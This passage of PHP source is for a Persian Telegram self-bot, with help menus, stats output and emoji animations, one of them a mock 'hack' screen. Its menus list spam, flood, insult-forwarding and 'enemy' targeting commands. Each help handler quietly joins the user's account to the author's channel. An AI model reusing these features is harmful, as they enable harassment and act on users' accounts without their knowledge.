⁅———— ◕ ————⁆
<code>تانک</code>
⁅———— ◕ ————⁆
<code>love3</code>
⁅———— ◕ ————⁆
<code>دایناسور</code>
⁅———— ◕ ————⁆
<code>روانی</code>
⁅———— ◕ ————⁆
<code>دهنت سرویس</code>
⁅———— ◕ ————⁆
<code>هک کردن</code>
⁅———— ◕ ————⁆
<code>203</code>
سرور کیه؟
⁅———— ◕ ————⁆
<code>کرج</code> 🤝
⁅———— ◕ ————⁆
دریافت وضعیت ربات

",
                            'parse_mode' => 'markdown']);
                    }
                    if ($text == 'pra' or $text == 'راهنما سرگرمی2') {
                        $load = sys_getloadavg();
                        $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
                        $MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
لطفا از راهنمای فارسی استفاده کنید
دستور فارسی کردن :
lang fa
",
                                'parse_mode' => 'markdown']);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
⁅———— ◕ ————⁆
 wiki (text) 
 جستجو در ویکی پدیا 

⁅———— ◕ ————⁆
 /weather اسم شهر 
 دریافت وضعیت هوای شهر دلخواه 

⁅———— ◕ ————⁆
 /music  [متن] 
 موسیقی دلخواه 

⁅———— ◕ ————⁆
 /info  [@username] 
 اطلاعات کاربر با ایدی 

⁅———— ◕ ————⁆
 gpinfo 
 دریافت اطلاعات گروه 

⁅———— ◕ ————⁆
 /sessions 
 دریافت نشصت های فعال اکانت 

⁅———— ◕ ————⁆
 /save  [ریپلی] 
 زخیره کردن متن فایل و هرچیز دیگعی تو پیوی (فضای ابری ) ربات 

⁅———— ◕ ————⁆
 /id  [ریپلی] 
 دریافت ایدی عددی شخص با ریپلی 

⁅———— ◕ ————⁆
 pic (متن) 
 دریافت عکس مرتبط با متن 

⁅———— ◕ ————⁆
 gif (متن) 
 دریافت گیف مرتبط با متن 

⁅———— ◕ ————⁆
 /joke 
 جوک بصورت رندوم 

⁅———— ◕ ————⁆
 like (متن) 
 ساخت متن بهمراه دکمه ی لایک 

⁅———— ◕ ————⁆
 search (متن) 
 جستجوی متن تو پیوی و گروه 

⁅———— ◕ ————⁆
 ساعت 
 دریافت ساعت دقیق تا 60 صانیه بروز میشه 

⁅———— ◕ ————⁆
 تاریخ شمسی 
 ریافت تاریخ شمسی 

⁅———— ◕ ————⁆
 تاریخ میلادی
 دریافت تاریخ میلادی 

⁅———— ◕ ————⁆
font text
دریافت 138 فونت زیبا

⁅———— ◕ ————⁆
",
                                'parse_mode' => 'markdown']);
                        }
                    }
                    if ($text == 'act' or $text == 'راهنما اکشن') {
                        $load = sys_getloadavg();
                        $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
                        $MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
لطفا از راهنمای فارسی استفاده کنید
دستور فارسی کردن :
lang fa
",
                                'parse_mode' => 'markdown']);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "

⁅———— ◕ ————⁆
•» <code>typing</code> on | off
 روشن و خاموش کردن حالت (درحال نوشتن)
⁅———— ◕ ————⁆
•» <code>videoaction</code> on | off
  روشن خاموش کردن حالت ظبط ویدیو 🎞
⁅———— ◕ ————⁆
•» <code>audioaction</code> on | off
 روشن و خاموش کردن حالت ظبط صدا 🎤
⁅———— ◕ ————⁆
•» <code>gameplay</code> on | off
 روشن و خاموش کردن حالت بازی 🎮
⁅———— ◕ ————⁆
•» <code>markread</code> on | off
 روشن و خاموش کردن حالت سین خودکار 
⁅———— ◕ ————⁆
•» <code>poker</code>  on | off
 روشن و خاموش کردن حالت پوکر
⁅———— ◕ ————⁆
•» <code>echo</code>  on | off
 روشن یا خاموش کردن حالت طوطی
⁅———— ◕ ————⁆
•» <code>lockpv</code>  on | off
 وقتی این حالت رو روشن کنید هرکسی پیوی پیام بده بلاک میشه! 
⁅———— ◕ ————⁆
•» <code>autochat</code>  on | off
 حالت پاسخگویی خودکار! 
⁅———— ◕ ————⁆
",
                                'parse_mode' => 'markdown']);
                        }
                    }
                    if ($text == 'tim' or $text == 'راهنما ساعت') {
                        $load = sys_getloadavg();
                        $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
                        $MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
لطفا از راهنمای فارسی استفاده کنید
دستور فارسی کردن :
lang fa
",
                                'parse_mode' => 'markdown']);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "

⁅———— ◕ ————⁆
| <code>timename</code> on | off
|  ساعت توی اسم 📱
⁅———— ◕ ————⁆
| <code>timebio</code> on | off
|  ساعت توی بیو 📱
⁅———— ◕ ————⁆
| <code>timepic</code> on | off
|  ساعت تو عکس پروفایل 📱
⁅———— ◕ ————⁆

",
                                'parse_mode' => 'markdown']);
                        }
                    }
                    if ($text == 'msg' or $text == 'راهنما متن') {
                        $load = sys_getloadavg();
                        $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
                        $MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
لطفا از راهنمای فارسی استفاده کنید
دستور فارسی کردن :
lang fa
",
                                'parse_mode' => 'markdown']);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
⁅———— ◕ ————⁆
 <code>hashtag</code> on | off
• روشن یا خاموش کردن حالت هشتگ•
⁅———— ◕ ————⁆
 <code>bold</code> on | off
• روشن یا خاموش کردن حالت بولد کردن متن•
⁅———— ◕ ————⁆
 <code>strikethrough</code> on | off
•روشن یا خاموش کردن حالت روی خط •
⁅———— ◕ ————⁆
 <code>italic</code> on | off
• روشن یا خاموش کردن حالت کج نویسی متن •
⁅———— ◕ ————⁆
 <code>underline</code> on | off
•روشن یا خاموش کردن حالت زیر خط •
⁅———— ◕ ————⁆
 <code>part</code> on | off
• روشن یا خاموش کردن حالت ادیت مسیج •
⁅———— ◕ ————⁆
 <code>coding</code> on | off
•روشن و خاموش کردن حالت نوشتن کد •
⁅———— ◕ ————⁆
 <code>mention</code> on | off
•روشن و خاموش کردن حالت منشن کردن•
⁅———— ◕ ————⁆
",
                                'parse_mode' => 'markdown']);
                        }
                    }
                    if ($text == 'spm' or $text == 'راهنما اسپم') {
                        $load = sys_getloadavg();
                        $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
                        $MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
لطفا از راهنمای فارسی استفاده کنید
دستور فارسی کردن :
lang fa
",
                                'parse_mode' => 'markdown']);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "

⁅———— ◕ ————⁆
 flood  [تعداد] [متن] 
 اسپم جمله تو یک پیام 
 مثال 
flood 10 رضا
⁅———— ◕ ————⁆
•» spam  [تعداد] [متن] «•
 ارسال یک پیام ب تعداد دلخواه 
 مثال 
spam 10 رضا
⁅———— ◕ ————⁆
 <code>for</code> 
 فوروارد فحش بصورت مکرر 
⁅———— ◕ ————⁆
 <code>Spam ss</code> 
 برای اسپم کردن اسکرین گرفتن 
⁅———— ◕ ————⁆
",
                                'parse_mode' => 'markdown']);
                        }
                    }
                    if ($text == 'ans' or $text == 'راهنما جواب') {
                        $load = sys_getloadavg();
                        $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
                        $MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
لطفا از راهنمای فارسی استفاده کنید
دستور فارسی کردن :
lang fa
",
                                'parse_mode' => 'markdown']);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "

⁅———— ◕ ————⁆
 /setanswer  جواب|متن  
 تنظیم جواب خودکار برای یه کلمه یا جمله 
 مثال 
/setanswer reza|hi 
 فارسیم میتونین بنویسین 
⁅———— ◕ ————⁆
 /delanswer  [متن] 
 حذف جواب خودکار 
 مثال 
/delanswer reza
⁅———— ◕ ————⁆
 /answerlist 
 دریافت لیست جواب خودکار 
⁅———— ◕ ————⁆

",
                                'parse_mode' => 'markdown']);
                        }
                    }
                    if ($text == 'tan' or $text == 'راهنماهای اضافی') {
                        $load = sys_getloadavg();
                        $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
                        $MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
لطفا از راهنمای فارسی استفاده کنید
دستور فارسی کردن :
lang fa
",
                                'parse_mode' => 'markdown']);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "

⁅———— ◕ ————⁆
•»  <code>/bot </code> on | off
 خاموش و روشن کردن ربات 
⁅———— ◕ ————⁆
 <code>/restart</code> 
 ریستارت کردن ربات 
⁅———— ◕ ————⁆
   <code>ping</code>    ربات  
 اطلاع از انلاین بودن ربات 
⁅———— ◕ ————⁆
  <code>load</code>   
 دریافت پینگ سرور 
⁅———— ◕ ————⁆
 <code>hash text</code> 
 هش کردن متن موردنظر «•
⁅———— ◕ ————⁆
 <code>/proxy</code>
 دریافت پروکسی تلگرام
⁅———— ◕ ————⁆
 <code>ping site.com</code>
 گرفتن پینگ سایت موردنظر
⁅———— ◕ ————⁆
 <code>encode text</code> یا <code>decode text</code> 
 دیکد یا انکد کردن متن (رمزگزاری کردن بصورت Base64) 
⁅———— ◕ ————⁆
•» <code>Left</code> یا لفت «•
 لفت دادن از گروه  
⁅———— ◕ ————⁆
",
                                'parse_mode' => 'markdown']);
                        }
                    }
                    if ($text == 'eny' or $text == 'راهنمای دشمن') {
                        $load = sys_getloadavg();
                        $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
                        $MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
لطفا از راهنمای فارسی استفاده کنید
دستور فارسی کردن :
lang fa
",
                                'parse_mode' => 'markdown']);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "

⁅———— ◕ ————⁆
• <code>/setenemy</code>  آیدی عددی یا ریپلی  •
تنظیم کردن دشمن
/setenemy replay 
⁅———— ◕ ————⁆
• <code>/delenemy</code> آیدی عددی یا ریپلی •
حذف کاربر از لیست دشمن
/delenemy replay 
⁅———— ◕ ————⁆
•  <code>reset enemylist</code>  •
 پاکسازی لیست دشمن 
⁅———— ◕ ————⁆
",
                                'parse_mode' => 'markdown']);
                        }
                    }
                    if ($text == 'gro' or $text == 'گپ هلپ') {
                        $load = sys_getloadavg();
                        $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
                        $MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
لطفا از راهنمای فارسی استفاده کنید
دستور فارسی کردن :
lang fa
",
                                'parse_mode' => 'markdown']);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
⁅———— ◕ ————⁆
⌬  <code>clean msg</code>  
پاکسازی پیام ها!
مثال : <code>clean 100</code>
⁅———— ◕ ————⁆
⌬ <code>ban replay</code> 
بن کردن کاربر!
⁅———— ◕ ————⁆
⌬ <code>unban replay</code> 
حذف بن کاربر
⁅———— ◕ ————⁆
⌬ <code>silent replay</code> 
سکوت کردن کاربر
⁅———— ◕ ————⁆
⌬ <code>unsilent replay</code> 
حذف سکوت کردن کابر
⁅———— ◕ ————⁆
⌬ <code>delall replay</code> 
پاکسازی تمامی پیام های کاربری که روش ریپلی شده
⁅———— ◕ ————⁆
⌬ <code>tagall</code> 
تگ کردن تمامی ممبر های گروه
⁅———— ◕ ————⁆
⌬ <code>locklink</code> on | off
قفل کردن لینک
⁅———— ◕ ————⁆
⌬ <code>lockgp</code> on | off
قفل کردن گروه 
⁅———— ◕ ————⁆
⌬ <code>locktag</code>  on | off
قفل کردن ایدی در گروه
⁅———— ◕ ————⁆
⁦
",
                                'parse_mode' => 'markdown']);
                        }
                    }
                    if ($text == 'help' or $text == 'راهنما' or $text == 'راهنمافارسی' or $text == 'راهنمای فارسی' or $text == 'HelpFa' or $text == 'helpFa' or $text == 'helpfa' or $text == 'Help Fa' or $text == 'help fa ') {
                        $load = sys_getloadavg();
                        $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
                        $hour = jdate('H:i:s');
                        $MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "

┈┅┅𝄩𝄩𝄩ˢᴱᴸᶠ ᴋᴀʙᴏs ⱽ10𝄩𝄩𝄩┅┅┈

پنل گروه        .   [⇚] - ☆ `gro` ➥
پنل منشی     .   [⇚] - ☆ `ans` ➥ 
پنل تایم         .   [⇚] - ☆ `tim` ➥ 
پنل مسیج     .   [⇚] - ☆ `msg` ➥
پنل کاربردی   .   [⇚] - ☆ `pra` ➥
پنل اکشن      .   [⇚] - ☆ `act` ➥
پنل انمی         .   [⇚] - ☆ `eny` ➥
پنل اسپم        .   [⇚] - ☆ `spm` ➥
پنل تنظیمات   .   [⇚] - ☆ `tan` ➥
پنل سرگرمی    .   [⇚] - ☆ `fun` ➥ 

☆☆☆ ━━ ━━ ☆ 
𖣘 **time** : [ $hour ] 𖣘  
☆☆☆ ━━ ━━ ☆ 
آمار  🔖 - ☆ `stats`   ➥
R͇͇A͇͇M͇͇  : ➥ - $mem_using ᴍʙ
P͇͇I͇͇N͇͇G͇͇ :  ➥ - $load[0]
",
                            'parse_mode' => 'markdown']);
                    }

                    if ($text == 'stats' or $text == 'آمار' or $text == 'Stats' or $text == 'sTaTs') {
                        $res = ['bot' => 0, 'user' => 0, 'chat' => 0, 'channel' => 0, 'supergroup' => 0];
                        foreach ($this->get_dialogs() as $dialog) {
                            $res[$this->get_info($dialog)['type']]++;
                        }
                        $g = json_encode($res);
                        $gf = json_decode($g);
                        $users = $gf->user;
                        $groups = $gf->chat;
                        $supergroups = $gf->supergroup;
                        $channels = $gf->channel;
                        $bots = $gf->bot;
                        $all = $users + $groups + $supergroups + $channels + $bots;
                        $load = sys_getloadavg();
                        $mem = memory_get_usage();
                        $ver = phpversion();
                        $load = sys_getloadavg();
                        $ver = phpversion();
                        $timebiotimebio = file_get_contents("timebio.txt");
                        $timename = file_get_contents("timename.txt");
                        $Timepic = file_get_contents("timepic.txt");
                        $Bold = file_get_contents("bold.txt");
                        $italic = file_get_contents("italic.txt");
                        $Answeres = file_get_contents("markread.txt");
                        $Gameplay = file_get_contents("gameplay.txt");
                        $Markread = file_get_contents("markread.txt");
                        $Typinges = file_get_contents("typing.txt");
                        $partmode = file_get_contents("part.txt");
                        $codingmode = file_get_contents("coding.txt");
                        $strikethrough = file_get_contents("strikethrough.txt");
                        $undermode = file_get_contents("underline.txt");
                        $audioaction = file_get_contents("audioaction.txt");
                        $lockpv = file_get_contents("lockpv.txt");
                        $hashtagmode = file_get_contents("hashtag.txt");
                        $load = sys_getloadavg();
                        $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "⁅———— ◕ ————⁆
 ᴛɪᴍᴇʙɪᴏ TAK : $timebio
 ᴛɪᴍᴇɴᴀᴍᴇ RAND : $timename
 Tʏᴘɪɴɢ : $Typinges
 ᴛɪᴍᴇᴘɪᴄ : $Timepic
 ʙᴏʟᴅᴛᴇxᴛ : $Bold
 ɪᴛᴀʟɪᴄ : $italic
 ʟᴏᴄᴋᴘᴠ : $lockpv
 Aɴsᴡᴇʀ : $Answeres
 ɢᴀᴍᴇᴘʟᴀʏ : $Gameplay
 ᴍᴀʀᴋʀᴇᴀᴅ : $Markread
 ᴘᴀʀᴛᴍᴏᴅᴇ : $partmode
 ᴀᴜᴅɪᴏᴀᴄᴛɪᴏɴ : $audioaction
 ʜᴀꜱʜᴛᴀɢᴍᴏᴅᴇ : $hashtagmode
 ᴜɴᴅᴇʀʟɪɴᴇ : $undermode
 ꜱᴛʀɪᴋᴇᴛʜʀᴏᴜɢʜ : $strikethrough
 ᴄᴏᴅɪɴɢ : $codingmode
⁅———— ◕ ————⁆", 'parse_mode' => 'MarkDown']);
                    }
                    if ($text == '/GhohNakhordokhtar' or $text == 'گوه نخور پسر') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '💩________________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_______________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩______________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_____________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩️____________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩___________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩__________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩________🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩️_______🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩______🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩____🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩___🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩️__🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_🚶‍♂️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩نوش جان💩']);
                    }

                    if ($text == '/GhohNakhordokhtar' or $text == 'گوه نخور دختر') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '💩________________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_______________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩______________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_____________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩️____________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩___________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩__________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩________🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩️_______🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩______🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩____🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩___🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩️__🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩_🚶‍♀️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💩نوش جان💩']);
                    }
                    if ($text == '/Ravani' or $text == 'روانی') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🚶🏿‍♀________________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀_______________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀______________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀_____________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀____________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀___________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀__________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀_________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀________🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀_______🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀______🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀____🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀___🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀__🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🚶🏿‍♀_🚑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏨']);
                    }
                    if ($text == 'تانک' or $text == 'tank') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (҂`_´)
         <,︻╦̵̵ ╤─ ҉     ~  •
█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (҂`_´)
         <,︻╦̵̵ ╤─ ҉     ~  •
█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●
▂▄▅█████████▅▄▃▂…"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (҂`_´)
         <,︻╦̵̵ ╤─ ҉     ~  •
█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●
▂▄▅█████████▅▄▃▂…
[███████████████████]"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (҂`_´)
         <,︻╦̵̵ ╤─ ҉     ~  •
█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●
▂▄▅█████████▅▄▃▂…
[███████████████████]
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "تانک رو دیدی؟؟🤔"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "دیگه نمیبینی😆"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💥🔥بوم💥🔥"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ".        (҂`_´)
         <,︻╦̵̵ ╤─ ҉     ~  •
█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●
▂▄▅█████████▅▄▃▂…
[███████████████████]
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙"]);

                    }
                    if ($text == 'دایناسور') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "█████████"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "█████████
█▄█████▄█"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "█████████
█▄█████▄█
█▼▼▼▼▼
█ 
█▲▲▲▲▲"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "█████████
█▄█████▄█
█▼▼▼▼▼
█ 
█▲▲▲▲▲
█████████
 ██ ██"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "█████████
█▄█████▄█
█▼▼▼▼▼
█  
█▲▲▲▲▲
█████████
 ██ ██"]);

                    }
                    if ($text == 'hack' or $text == 'Hack' or $text == 'هک' or $text == 'هک شدی') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█ 
████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█
███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█ 
████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█
███▓▓▓▓▓▓▓╬╬▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
████▓▓▓╬╬╬╬▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ 
█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██ 
█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███
██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███
███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████
███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████ 
████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████
█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████ 
██████████▓▓▓█▓▓▓╬▓██╬╬╬╬╬╬╬╬╬╬╬▓███████
███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████ 
██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████ 
███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█ 
████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█ 
███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█ 
████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█ 
███▓▓▓▓▓▓▓╬╬▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
████▓▓▓╬╬╬╬▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ 
